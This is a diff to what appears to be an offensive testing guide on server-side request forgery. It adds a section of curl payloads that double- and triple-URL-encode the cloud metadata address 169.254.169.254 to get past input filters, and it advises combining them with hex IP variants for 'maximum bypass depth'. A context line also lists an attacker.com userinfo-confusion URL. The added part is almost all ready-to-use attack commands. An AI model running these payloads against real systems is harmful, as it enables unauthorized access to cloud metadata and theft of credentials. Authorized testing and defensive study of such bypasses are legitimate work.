@@ -80,7 +80,21 @@ for ip in "0xa9.0xfe.0xa9.0xfe" "0xA9FEA9FE" "2852039166" \
 done
 ```
 
-### 5. URL parser edge cases (if all encoding fails)
+### 5. Double/triple URL encoding (if filter decodes once before checking)
+Some filters URL-decode the input, then check the decoded string. Double-encode so the filter sees the encoded form but the backend decodes again:
+```bash
+# Single-encoded dots (filter may decode and block)
+curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%2e254%2e169%2e254/"
+# Double-encoded dots (filter decodes to %2e, backend decodes to .)
+curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%252e254%252e169%252e254/"
+# Double-encoded slash in path
+curl -x localhost:8080 -k "https://target.com/fetch?url=http://0xa9.254.169.254%252flatest%252fmeta-data/"
+# Triple-encode if two decode layers exist
+curl -x localhost:8080 -k "https://target.com/fetch?url=http://169%25252e254%25252e169%25252e254/"
+```
+Combine with IP encoding variants above — double-encode the hex IP for maximum bypass depth.
+
+### 6. URL parser edge cases (if all encoding fails)
 Some parsers also fail on:
 ```
 http://169.254.169.254@attacker.com/  (userinfo confusion)
